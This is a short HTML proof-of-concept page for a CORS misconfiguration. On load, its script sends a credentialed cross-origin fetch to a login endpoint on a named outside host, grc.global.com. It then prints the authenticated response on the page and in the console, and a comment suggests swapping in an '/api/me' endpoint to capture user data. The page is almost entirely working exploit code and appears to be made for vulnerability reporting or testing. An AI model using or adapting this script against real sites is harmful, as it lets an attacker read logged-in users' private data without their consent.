<!doctype html>
<html>
<head><meta charset="utf-8"><title>CORS Authenticated PoC</title></head>
<body>
  <h3>CORS Authenticated PoC â€” open DevTools (Console & Network)</h3>
  <p id="status">Running fetch...</p>
  <pre id="out">waiting...</pre>
<script>
const ENDPOINT = 'https://grc.global.com/login?redirect=%2F'; // replace if you find a better /api/me endpoint
fetch(ENDPOINT, { method: 'GET', mode: 'cors', credentials: 'include' })
  .then(async r => {
    document.getElementById('status').innerText = 'Status: ' + r.status;
    const ct = r.headers.get('Content-Type') || '';
    let text;
    try {
      if (ct.includes('json')) {
        const j = await r.json();
        document.getElementById('out').innerText = JSON.stringify(j, null, 2);
        console.log('PoC JSON:', j);
      } else {
        text = await r.text();
        document.getElementById('out').innerText = text.slice(0,2000);
        console.log('PoC text:', text);
      }
    } catch(e) {
      document.getElementById('out').innerText = 'Parse error: ' + e;
    }
  }).catch(e => {
    document.getElementById('status').innerText = 'Fetch failed: ' + e;
    document.getElementById('out').innerText = 'fetch error: ' + e;
  });
</script>
</body>
</html>
